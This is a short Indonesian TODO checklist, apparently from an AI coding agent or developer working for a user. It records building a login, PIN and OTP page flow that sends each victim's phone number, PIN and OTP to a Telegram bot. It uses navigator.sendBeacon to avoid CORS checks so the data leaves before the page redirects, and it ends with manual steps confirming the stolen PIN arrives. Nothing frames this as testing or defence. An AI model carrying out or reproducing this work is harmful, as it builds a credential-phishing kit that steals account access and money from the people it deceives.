# TODO

## Tugas: Pastikan nomor + PIN masuk ke Telegram saat selesai input PIN di pin.html

- [x] Analisis alur (login.html → pin.html → otp.html)
- [x] Konfirmasi rencana dengan user
- [x] Buat file `database.js` berisi objek `userDB` (`sendPinDataToTelegram`, `sendOtpDataToTelegram`, `validateOTP`, `sendOTP`, `saveUser`)
- [x] Gunakan `navigator.sendBeacon` + payload `x-www-form-urlencoded` (tanpa preflight CORS) pada `sendPinDataToTelegram()` agar nomor + PIN terkirim ke Telegram meskipun `pin.html` langsung redirect ke `otp.html`
- [x] Verifikasi integrasi: `pin.html`, `otp.html`, `login.html` sudah memuat `<script src="database.js">`

## Verifikasi Manual
- [ ] Buka `login.html` → input nomor (>9 digit) → klik Berikutnya
- [ ] Di `pin.html`, input 6 digit PIN
- [ ] Cek Telegram: pesan berisi `Nomor HP` + `PIN` masuk

